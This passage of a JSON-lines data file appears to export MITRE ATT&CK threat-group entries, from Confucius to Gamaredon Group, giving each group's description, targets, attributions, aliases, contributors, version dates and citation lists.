Gang Oct 2018),(Citation: PTSecurity Cobalt Dec 2016),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Talos Cobalt Group July 2018),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: RiskIQ Cobalt Nov 2017),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Crowdstrike Global Threat Report Feb 2018),(Citation: Proofpoint Cobalt June 2017),(Citation: Group IB Cobalt Aug 2017),(Citation: RiskIQ Cobalt Jan 2018),"}
{"ID":"G0142","name":"Confucius","description":"[Confucius](https://attack.mitre.org/groups/G0142) is a cyber espionage group that has primarily targeted military personnel, high-profile personalities, business persons, and government organizations in South Asia since at least 2013. Security researchers have noted similarities between [Confucius](https://attack.mitre.org/groups/G0142) and [Patchwork](https://attack.mitre.org/groups/G0040), particularly in their respective custom malware code and targets.(Citation: TrendMicro Confucius APT Feb 2018)(Citation: TrendMicro Confucius APT Aug 2021)(Citation: Uptycs Confucius APT Jan 2021)","url":"https://attack.mitre.org/groups/G0142","created":"26 December 2021","last modified":"30 June 2022","version":"1.0","contributors":null,"associated groups":"Confucius APT","associated groups citations":null,"relationship citations":"(Citation: Check Point Warzone Feb 2020),(Citation: Uptycs Confucius APT Jan 2021),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Uptycs Confucius APT Jan 2021),"}
{"ID":"G0052","name":"CopyKittens","description":"[CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip.(Citation: ClearSky CopyKittens March 2017)(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015)","url":"https://attack.mitre.org/groups/G0052","created":"16 January 2018","last modified":"08 August 2022","version":"1.6","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: ClearSky Wilted Tulip July 2017),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ClearSky and Trend Micro Operation Wilted Tulip July 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: CopyKittens Nov 2015),"}
{"ID":"G0070","name":"Dark Caracal","description":"[Dark Caracal](https://attack.mitre.org/groups/G0070) is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012. (Citation: Lookout Dark Caracal Jan 2018)","url":"https://attack.mitre.org/groups/G0070","created":"17 October 2018","last modified":"11 October 2021","version":"1.3","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Lookout Dark Caracal Jan 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: Lookout Dark Caracal Jan 2018),"}
{"ID":"G0079","name":"DarkHydrus","description":"[DarkHydrus](https://attack.mitre.org/groups/G0079) is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom payloads for carrying out attacks. (Citation: Unit 42 DarkHydrus July 2018) (Citation: Unit 42 Playbook Dec 2017)","url":"https://attack.mitre.org/groups/G0079","created":"17 October 2018","last modified":"12 October 2021","version":"1.3","contributors":"Oleg Skulkin, Group-IB","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Unit 42 DarkHydrus July 2018),(Citation: Unit 42 Playbook Dec 2017),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Unit 42 Phishery Aug 2018),(Citation: Unit 42 Playbook Dec 2017),"}
{"ID":"G0105","name":"DarkVishnya","description":"[DarkVishnya](https://attack.mitre.org/groups/G0105) is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region.(Citation: Securelist DarkVishnya Dec 2018)","url":"https://attack.mitre.org/groups/G0105","created":"15 May 2020","last modified":"12 October 2021","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Securelist DarkVishnya Dec 2018),(Citation: Securelist DarkVishnya Dec 2018),"}
{"ID":"G0012","name":"Darkhotel","description":"[Darkhotel](https://attack.mitre.org/groups/G0012) is a suspected South Korean threat group that has targeted victims primarily in East Asia since at least 2004. The group's name is based on cyber espionage operations conducted via hotel Internet networks against traveling executives and other select guests. [Darkhotel](https://attack.mitre.org/groups/G0012) has also conducted spearphishing campaigns and infected victims through peer-to-peer and file sharing networks.(Citation: Kaspersky Darkhotel)(Citation: Securelist Darkhotel Aug 2015)(Citation: Microsoft Digital Defense FY20 Sept 2020)","url":"https://attack.mitre.org/groups/G0012","created":"31 May 2017","last modified":"19 October 2022","version":"2.1","contributors":"Harry, CODEMIZE","associated groups":"DUBNIUM","associated groups citations":"(Citation: Microsoft Digital Defense FY20 Sept 2020)(Citation: Microsoft DUBNIUM June 2016)(Citation: Microsoft DUBNIUM Flash June 2016)(Citation: Microsoft DUBNIUM July 2016)","relationship citations":",(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: Microsoft DUBNIUM June 2016),(Citation: Microsoft DUBNIUM July 2016),(Citation: Kaspersky Darkhotel),(Citation: Securelist Darkhotel Aug 2015),"}
{"ID":"G0009","name":"Deep Panda","description":"[Deep Panda](https://attack.mitre.org/groups/G0009) is a suspected Chinese threat group known to target many industries, including government, defense, financial, and telecommunications. (Citation: Alperovitch 2014) The intrusion into healthcare company Anthem has been attributed to [Deep Panda](https://attack.mitre.org/groups/G0009). (Citation: ThreatConnect Anthem) This group is also known as Shell Crew, WebMasters, KungFu Kittens, and PinkPanther. (Citation: RSA Shell Crew) [Deep Panda](https://attack.mitre.org/groups/G0009) also appears to be known as Black Vine based on the attribution of both group names to the Anthem intrusion. (Citation: Symantec Black Vine) Some analysts track [Deep Panda](https://attack.mitre.org/groups/G0009) and [APT19](https://attack.mitre.org/groups/G0073) as the same group, but it is unclear from open source information if the groups are the same. (Citation: ICIT China's Espionage Jul 2016)","url":"https://attack.mitre.org/groups/G0009","created":"31 May 2017","last modified":"20 July 2022","version":"1.2","contributors":"Andrew Smith, @jakx_","associated groups":"Black Vine, KungFu Kittens, PinkPanther, Shell Crew, WebMasters","associated groups citations":"(Citation: Symantec Black Vine), (Citation: RSA Shell Crew), (Citation: RSA Shell Crew), (Citation: RSA Shell Crew), (Citation: RSA Shell Crew)","relationship citations":"(Citation: Symantec Black Vine),(Citation: Alperovitch 2014),(Citation: Cylance Shell Crew Feb 2017),(Citation: ThreatConnect Anthem),(Citation: RSA Shell Crew),(Citation: Symantec Black Vine),(Citation: Alperovitch 2014),(Citation: CrowdStrike Deep Panda Web Shells),"}
{"ID":"G0017","name":"DragonOK","description":"[DragonOK](https://attack.mitre.org/groups/G0017) is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, [DragonOK](https://attack.mitre.org/groups/G0017) is thought to have a direct or indirect relationship with the threat group [Moafee](https://attack.mitre.org/groups/G0002). (Citation: Operation Quantum Entanglement) It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, and NewCT. (Citation: New DragonOK)","url":"https://attack.mitre.org/groups/G0017","created":"31 May 2017","last modified":"22 March 2019","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Operation Quantum Entanglement),(Citation: New DragonOK),,"}
{"ID":"G0035","name":"Dragonfly","description":"[Dragonfly](https://attack.mitre.org/groups/G0035) is a cyber espionage group that has been attributed to Russia's Federal Security Service (FSB) Center 16.(Citation: DOJ Russia Targeting Critical Infrastructure March 2022)(Citation: UK GOV FSB Factsheet April 2022) Active since at least 2010, [Dragonfly](https://attack.mitre.org/groups/G0035) has targeted defense and aviation companies, government entities, companies related to industrial control systems, and critical infrastructure sectors worldwide through supply chain, spearphishing, and drive-by compromise attacks.(Citation: Symantec Dragonfly)(Citation: Secureworks IRON LIBERTY July 2019)(Citation: Symantec Dragonfly Sept 2017)(Citation: Fortune Dragonfly 2.0 Sept 2017)(Citation: Gigamon Berserk Bear October 2021)(Citation: CISA AA20-296A Berserk Bear December 2020)(Citation: Symantec Dragonfly 2.0 October 2017)","url":"https://attack.mitre.org/groups/G0035","created":"31 May 2017","last modified":"08 March 2023","version":"3.1","contributors":"Dragos Threat Intelligence","associated groups":"Berserk Bear, Crouching Yeti, DYMALLOY, Energetic Bear, IRON LIBERTY, TEMP.Isotope, TG-4192","associated groups citations":"(Citation: Gigamon Berserk Bear October 2021)(Citation: DOJ Russia Targeting Critical Infrastructure March 2022)(Citation: UK GOV FSB Factsheet April 2022), (Citation: Secureworks IRON LIBERTY July 2019)(Citation: Gigamon Berserk Bear October 2021)(Citation: DOJ Russia Targeting Critical Infrastructure March 2022)(Citation: UK GOV FSB Factsheet April 2022), (Citation: Dragos DYMALLOY )(Citation: UK GOV FSB Factsheet April 2022), (Citation: Symantec Dragonfly)(Citation: Secureworks IRON LIBERTY July 2019)(Citation: Secureworks MCMD July 2019)(Citation: Secureworks Karagany July 2019)(Citation: Gigamon Berserk Bear October 2021)(Citation: DOJ Russia Targeting Critical Infrastructure March 2022)(Citation: UK GOV FSB Factsheet April 2022), (Citation: Secureworks IRON LIBERTY July 2019)(Citation: Secureworks MCMD July 2019)(Citation: Secureworks Karagany July 2019)(Citation: UK GOV FSB Factsheet April 2022), (Citation: Mandiant Ukraine Cyber Threats January 2022)(Citation: Gigamon Berserk Bear October 2021), (Citation: Secureworks IRON LIBERTY July 2019)(Citation: UK GOV FSB Factsheet April 2022)","relationship citations":"(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Core Security Impacket),(Citation: US-CERT TA18-074A),(Citation: Secureworks Karagany July 2019),(Citation: Symantec Dragonfly Sept 2017),(Citation: Symantec Dragonfly),(Citation: Gigamon Berserk Bear October 2021),(Citation: Secureworks MCMD July 2019),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Core Security Impacket),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: US-CERT TA18-074A),(Citation: Symantec Dragonfly Sept 2017),(Citation: Gigamon Berserk Bear October 2021),(Citation: Kali Hydra),"}
{"ID":"G1011","name":"EXOTIC LILY","description":"[EXOTIC LILY](https://attack.mitre.org/groups/G1011) is a financially motivated group that has been closely linked with [Wizard Spider](https://attack.mitre.org/groups/G0102) and the deployment of ransomware including [Conti](https://attack.mitre.org/software/S0575) and [Diavol](https://attack.mitre.org/software/S0659). [EXOTIC LILY](https://attack.mitre.org/groups/G1011) may be acting as an initial access broker for other malicious actors, and has targeted a wide range of industries including IT, cybersecurity, and healthcare since at least September 2021.(Citation: Google EXOTIC LILY March 2022)","url":"https://attack.mitre.org/groups/G1011","created":"18 August 2022","last modified":"24 October 2022","version":"1.0","contributors":"Phill Taylor, BT Security","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Google EXOTIC LILY March 2022),(Citation: Google EXOTIC LILY March 2022),(Citation: Proofpoint Bumblebee April 2022),"}
{"ID":"G1006","name":"Earth Lusca","description":"[Earth Lusca](https://attack.mitre.org/groups/G1006) is a suspected China-based cyber espionage group that has been active since at least April 2019. [Earth Lusca](https://attack.mitre.org/groups/G1006) has targeted organizations in Australia, China, Hong Kong, Mongolia, Nepal, the Philippines, Taiwan, Thailand, Vietnam, the United Arab Emirates, Nigeria, Germany, France, and the United States. Targets included government institutions, news media outlets, gambling companies, educational institutions, COVID-19 research organizations, telecommunications companies, religious movements banned in China, and cryptocurrency trading platforms; security researchers assess some [Earth Lusca](https://attack.mitre.org/groups/G1006) operations may be financially motivated.(Citation: TrendMicro EarthLusca 2022)\n\n[Earth Lusca](https://attack.mitre.org/groups/G1006) has used malware commonly used by other Chinese threat groups, including [APT41](https://attack.mitre.org/groups/G0096) and the [Winnti Group](https://attack.mitre.org/groups/G0044) cluster, however security researchers assess [Earth Lusca](https://attack.mitre.org/groups/G1006)'s techniques and infrastructure are separate.(Citation: TrendMicro EarthLusca 2022)","url":"https://attack.mitre.org/groups/G1006","created":"01 July 2022","last modified":"17 October 2022","version":"1.0","contributors":null,"associated groups":"TAG-22","associated groups citations":"(Citation: Recorded Future TAG-22 July 2021)","relationship citations":"(Citation: TrendMicro EarthLusca 2022),(Citation: TrendMicro EarthLusca 2022),"}
{"ID":"G0066","name":"Elderwood","description":"[Elderwood](https://attack.mitre.org/groups/G0066) is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora. (Citation: Security Affairs Elderwood Sept 2012) The group has targeted defense organizations, supply chain manufacturers, human rights and nongovernmental organizations (NGOs), and IT service providers. (Citation: Symantec Elderwood Sept 2012) (Citation: CSM Elderwood Sept 2012)","url":"https://attack.mitre.org/groups/G0066","created":"18 April 2018","last modified":"02 March 2021","version":"1.2","contributors":"Valerii Marchuk, Cybersecurity Help s.r.o.","associated groups":"Beijing Group, Elderwood Gang, Sneaky Panda","associated groups citations":"(Citation: CSM Elderwood Sept 2012), (Citation: Symantec Elderwood Sept 2012) (Citation: CSM Elderwood Sept 2012), (Citation: CSM Elderwood Sept 2012)","relationship citations":"(Citation: Symantec Elderwood Sept 2012),(Citation: CSM Elderwood Sept 2012),(Citation: Symantec Ristol May 2012),(Citation: Security Affairs Elderwood Sept 2012),(Citation: Symantec Elderwood Sept 2012),"}
{"ID":"G1003","name":"Ember Bear","description":"[Ember Bear](https://attack.mitre.org/groups/G1003) is a suspected Russian state-sponsored cyber espionage group that has been active since at least March 2021. [Ember Bear](https://attack.mitre.org/groups/G1003) has primarily focused their operations against Ukraine and Georgia, but has also targeted Western European and North American foreign ministries, pharmaceutical companies, and financial sector organizations. Security researchers assess [Ember Bear](https://attack.mitre.org/groups/G1003) likely conducted the [WhisperGate](https://attack.mitre.org/software/S0689) destructive wiper attacks against Ukraine in early 2022.(Citation: CrowdStrike Ember Bear Profile March 2022)(Citation: Mandiant UNC2589 March 2022)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) ","url":"https://attack.mitre.org/groups/G1003","created":"09 June 2022","last modified":"22 March 2023","version":"1.1","contributors":"Hannah Simes, BT Security","associated groups":"Bleeding Bear, Lorec Bear, Lorec53, Saint Bear, UAC-0056, UNC2589","associated groups citations":"(Citation: CrowdStrike Ember Bear Profile March 2022), (Citation: CrowdStrike Ember Bear Profile March 2022), (Citation: CrowdStrike Ember Bear Profile March 2022), (Citation: CrowdStrike Ember Bear Profile March 2022), (Citation: CrowdStrike Ember Bear Profile March 2022), (Citation: Mandiant UNC2589 March 2022)","relationship citations":"(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Mandiant UNC2589 March 2022),(Citation: CrowdStrike Ember Bear Profile March 2022),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),"}
{"ID":"G0020","name":"Equation","description":"[Equation](https://attack.mitre.org/groups/G0020) is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives. (Citation: Kaspersky Equation QA)","url":"https://attack.mitre.org/groups/G0020","created":"31 May 2017","last modified":"29 June 2020","version":"1.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: Kaspersky Gauss Whitepaper),(Citation: Kaspersky Equation QA),"}
{"ID":"G0120","name":"Evilnum","description":"[Evilnum](https://attack.mitre.org/groups/G0120) is a financially motivated threat group that has been active since at least 2018.(Citation: ESET EvilNum July 2020)","url":"https://attack.mitre.org/groups/G0120","created":"22 January 2021","last modified":"27 April 2021","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: ESET EvilNum July 2020),(Citation: Prevailion EvilNum May 2020),(Citation: ESET EvilNum July 2020),"}
{"ID":"G0051","name":"FIN10","description":"[FIN10](https://attack.mitre.org/groups/G0051) is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort organizations. (Citation: FireEye FIN10 June 2017)","url":"https://attack.mitre.org/groups/G0051","created":"14 December 2017","last modified":"26 May 2021","version":"1.3","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: FireEye FIN10 June 2017),(Citation: FireEye FIN10 June 2017),(Citation: Github PowerShell Empire),"}
{"ID":"G0085","name":"FIN4","description":"[FIN4](https://attack.mitre.org/groups/G0085) is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies, since at least 2013.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye FIN4 Stealing Insider NOV 2014) [FIN4](https://attack.mitre.org/groups/G0085) is unique in that they do not infect victims with typical persistent malware, but rather they focus on capturing credentials authorized to access email and other non-public correspondence.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014)","url":"https://attack.mitre.org/groups/G0085","created":"31 January 2019","last modified":"01 February 2023","version":"1.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: FireEye Hacking FIN4 Video Dec 2014),"}
{"ID":"G0053","name":"FIN5","description":"[FIN5](https://attack.mitre.org/groups/G0053) is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian. (Citation: FireEye Respond Webinar July 2017) (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015)","url":"https://attack.mitre.org/groups/G0053","created":"16 January 2018","last modified":"16 October 2021","version":"1.2","contributors":"Walker Johnson","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye Respond Webinar July 2017),"}
{"ID":"G0037","name":"FIN6","description":"[FIN6](https://attack.mitre.org/groups/G0037) is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019)","url":"https://attack.mitre.org/groups/G0037","created":"31 May 2017","last modified":"22 March 2023","version":"3.3","contributors":"Center for Threat-Informed Defense (CTID); Drew Church, Splunk","associated groups":"ITG08, Magecart Group 6, Skeleton Spider","associated groups citations":"(Citation: Security Intelligence More Eggs Aug 2019), (Citation: Security Intelligence ITG08 April 2020), (Citation: Crowdstrike Global Threat Report Feb 2018)","relationship citations":"(Citation: FireEye FIN6 Apr 2019),(Citation: FireEye FIN6 April 2016),(Citation: FireEye Maze May 2020),(Citation: Visa FIN6 Feb 2019),(Citation: Crowdstrike Global Threat Report Feb 2018),(Citation: Group IB GrimAgent July 2021),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Trend Micro FIN6 October 2019),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: RiskIQ Newegg September 2018),(Citation: Visa FIN6 Feb 2019),(Citation: RiskIQ British Airways September 2018),(Citation: Security Intelligence More Eggs Aug 2019),"}
{"ID":"G0046","name":"FIN7","description":"[FIN7](https://attack.mitre.org/groups/G0046) is a financially-motivated threat group that has been active since 2013 primarily targeting the U.S. retail, restaurant, and hospitality sectors, often using point-of-sale malware. A portion of [FIN7](https://attack.mitre.org/groups/G0046) was run out of a front company called Combi Security. Since 2020 [FIN7](https://attack.mitre.org/groups/G0046) shifted operations to a big game hunting (BGH) approach including use of [REvil](https://attack.mitre.org/software/S0496) ransomware and their own Ransomware as a Service (RaaS), Darkside. [FIN7](https://attack.mitre.org/groups/G0046) may be linked to the [Carbanak](https://attack.mitre.org/groups/G0008) Group, but there appears to be several groups using [Carbanak](https://attack.mitre.org/software/S0030) malware and are therefore tracked separately.(Citation: FireEye FIN7 March 2017)(Citation: FireEye FIN7 April 2017)(Citation: FireEye CARBANAK June 2017)(Citation: FireEye FIN7 Aug 2018)(Citation: CrowdStrike Carbon Spider August 2021)","url":"https://attack.mitre.org/groups/G0046","created":"31 May 2017","last modified":"22 March 2023","version":"2.2","contributors":"Edward Millington","associated groups":"Carbon Spider, GOLD NIAGARA, ITG14","associated groups citations":"(Citation: CrowdStrike Carbon Spider August 2021), (Citation: Secureworks GOLD NIAGARA Threat Profile), ITG14 shares campaign overlap with [FIN7](https://attack.mitre.org/groups/G0046).(Citation: IBM Ransomware Trends September 2020)","relationship citations":"(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: DOJ FIN7 Aug 2018),(Citation: FireEye FIN7 Oct 2019),(Citation: FBI Flash FIN7 USB),(Citation: Gemini FIN7 Oct 2021),(Citation: Trustwave Pillowmint June 2020),(Citation: FireEye FIN7 Aug 2018),(Citation: FireEye FIN7 March 2017),(Citation: FireEye FIN7 April 2017),(Citation: SecureList Griffon May 2019),(Citation: Threatpost Lizar May 2021),(Citation: IBM Ransomware Trends September 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: FireEye Obfuscation June 2017),(Citation: DOJ FIN7 Aug 2018),(Citation: eSentire FIN7 July 2021),(Citation: FBI Flash FIN7 USB),(Citation: FireEye FIN7 Oct 2019),(Citation: FireEye FIN7 Aug 2018),(Citation: FireEye CARBANAK June 2017),(Citation: CyberScoop FIN7 Oct 2017),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: FireEye FIN7 Shim Databases),(Citation: FireEye FIN7 April 2017),(Citation: Morphisec FIN7 June 2017),"}
{"ID":"G0061","name":"FIN8","description":"[FIN8](https://attack.mitre.org/groups/G0061) is a financially motivated threat group known to launch tailored spearphishing campaigns targeting the retail, restaurant, and hospitality industries. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Fin8 May 2016)","url":"https://attack.mitre.org/groups/G0061","created":"18 April 2018","last modified":"22 March 2023","version":"1.3","contributors":"Daniyal Naeem, BT Security","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Bitdefender FIN8 July 2021),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye Fin8 May 2016),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye Obfuscation June 2017),(Citation: Bitdefender FIN8 July 2021),(Citation: FireEye Fin8 May 2016),"}
{"ID":"G0137","name":"Ferocious Kitten","description":"[Ferocious Kitten](https://attack.mitre.org/groups/G0137) is a threat group that has primarily targeted Persian-speaking individuals in Iran since at least 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021)","url":"https://attack.mitre.org/groups/G0137","created":"28 September 2021","last modified":"25 October 2021","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),"}
{"ID":"G0117","name":"Fox Kitten","description":"[Fox Kitten](https://attack.mitre.org/groups/G0117) is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North America. [Fox Kitten](https://attack.mitre.org/groups/G0117) has targeted multiple industrial verticals including oil and gas, technology, government, defense, healthcare, manufacturing, and engineering.(Citation: ClearkSky Fox Kitten February 2020)(Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: Dragos PARISITE )(Citation: ClearSky Pay2Kitten December 2020)","url":"https://attack.mitre.org/groups/G0117","created":"21 December 2020","last modified":"22 March 2023","version":"1.1","contributors":null,"associated groups":"Parisite, Pioneer Kitten, UNC757","associated groups citations":"(Citation: Dragos PARISITE )(Citation: ClearkSky Fox Kitten February 2020)(Citation: CrowdStrike PIONEER KITTEN August 2020), (Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: CISA AA20-259A Iran-Based Actor September 2020), (Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: CrowdStrike PIONEER KITTEN August 2020)","relationship citations":"(Citation: Check Point Pay2Key November 2020),(Citation: CrowdStrike PIONEER KITTEN August 2020),(Citation: ClearkSky Fox Kitten February 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: ClearkSky Fox Kitten February 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Check Point Pay2Key November 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Dragos PARISITE ),(Citation: CrowdStrike PIONEER KITTEN August 2020),"}
{"ID":"G0093","name":"GALLIUM","description":"[GALLIUM](https://attack.mitre.org/groups/G0093) is a cyberespionage group that has been active since at least 2012, primarily targeting telecommunications companies, financial institutions, and government entities in Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia, and Vietnam. Security researchers have identified [GALLIUM](https://attack.mitre.org/groups/G0093) as a likely Chinese state-sponsored group, based in part on tools used and TTPs commonly associated with Chinese threat actors.(Citation: Cybereason Soft Cell June 2019)(Citation: Microsoft GALLIUM December 2019)(Citation: Unit 42 PingPull Jun 2022)","url":"https://attack.mitre.org/groups/G0093","created":"18 July 2019","last modified":"12 August 2022","version":"3.0","contributors":"Cybereason Nocturnus, @nocturnus; Daniyal Naeem, BT Security","associated groups":"Operation Soft Cell","associated groups citations":"(Citation: Cybereason Soft Cell June 2019)","relationship citations":"(Citation: Cybereason Soft Cell June 2019),(Citation: Microsoft GALLIUM December 2019),(Citation: Unit 42 PingPull Jun 2022),(Citation: Microsoft GALLIUM December 2019),(Citation: Cybereason Soft Cell June 2019),"}
{"ID":"G0036","name":"GCMAN","description":"[GCMAN](https://attack.mitre.org/groups/G0036) is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services. (Citation: Securelist GCMAN)","url":"https://attack.mitre.org/groups/G0036","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: Securelist GCMAN),"}
{"ID":"G0115","name":"GOLD SOUTHFIELD","description":"[GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) is a financially motivated threat group active since at least 2018 that operates the [REvil](https://attack.mitre.org/software/S0496) Ransomware-as-a Service (RaaS). [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) provides backend infrastructure for affiliates recruited on underground forums to perpetrate high value deployments. By early 2020, [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) started capitalizing on the new trend of stealing data and further extorting the victim to pay for their data to not get publicly leaked.(Citation: Secureworks REvil September 2019)(Citation: Secureworks GandCrab and REvil September 2019)(Citation: Secureworks GOLD SOUTHFIELD)(Citation: CrowdStrike Evolution of Pinchy Spider July 2021)","url":"https://attack.mitre.org/groups/G0115","created":"22 September 2020","last modified":"28 March 2023","version":"2.0","contributors":"Thijn Bukkems, Amazon","associated groups":"Pinchy Spider","associated groups citations":"(Citation: CrowdStrike Evolution of Pinchy Spider July 2021)","relationship citations":"(Citation: Secureworks REvil September 2019),(Citation: Anomali Static Kitten February 2021),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Secureworks REvil September 2019),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Secureworks GOLD SOUTHFIELD),"}
{"ID":"G0084","name":"Gallmaker","description":"[Gallmaker](https://attack.mitre.org/groups/G0084) is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military, and government sectors.(Citation: Symantec Gallmaker Oct 2018)","url":"https://attack.mitre.org/groups/G0084","created":"30 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: Symantec Gallmaker Oct 2018),"}
{"ID":"G0047","name":"Gamaredon Group","description":"[Gamaredon Group](https://attack.mitre.org/groups/G0047) is a suspected Russian cyber espionage threat group that has targeted military, NGO, judiciary, law enforcement, and non-profit organizations in Ukraine since at least 2013. The name [Gamaredon Group](https://attack.mitre.org/groups/G0047) comes from a misspelling of the word \"Armageddon\", which was detected in the adversary's early campaigns.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: Microsoft Actinium February 2022)\n\nIn November 2021, the Ukrainian government publicly attributed [Gamaredon Group](https://attack.mitre.org/groups/G0047) to Russia's Federal Security Service (FSB) Center 18.(Citation: Bleepingcomputer Gamardeon FSB November 2021)(Citation: Microsoft Actinium February 2022)","url":"https://attack.mitre.org/groups/G0047","created":"31 May 2017","last modified":"22 March 2023","version":"2.1","contributors":"ESET; Trend Micro Incorporated","associated groups":"ACTINIUM, Armageddon, DEV-0157, IRON TILDEN, Primitive Bear, Shuckworm","associated groups citations":"(Citation: Microsoft Actinium February 2022), (Citation: Symantec Shuckworm January 2022), (Citation: Microsoft Actinium February 2022), (Citation: Secureworks IRON TILDEN Profile), (Citation: Unit 42 Gamaredon February 2022), (Citation: Symantec Shuckworm January 2022)","relationship citations":"(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Symantec Shuckworm January 2022),(Citation: Secureworks IRON TILDEN Profile),(Citation: Unit 42 Gamaredon February 2022),(Citation: Microsoft Actinium February 2022),(Citation: TrendMicro Gamaredon April 2020),(Citation: Proofpoint RTF Injection),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: CERT-EE Gamaredon January 2021),(Citation: Symantec Shuckworm January 2022),(Citation: ESET Gamaredon June 2020),(Citation: Secureworks IRON TILDEN Profile),(Citation: Unit 42 Gamaredon February 2022),(Citation: Microsoft Actinium February 2022),"}
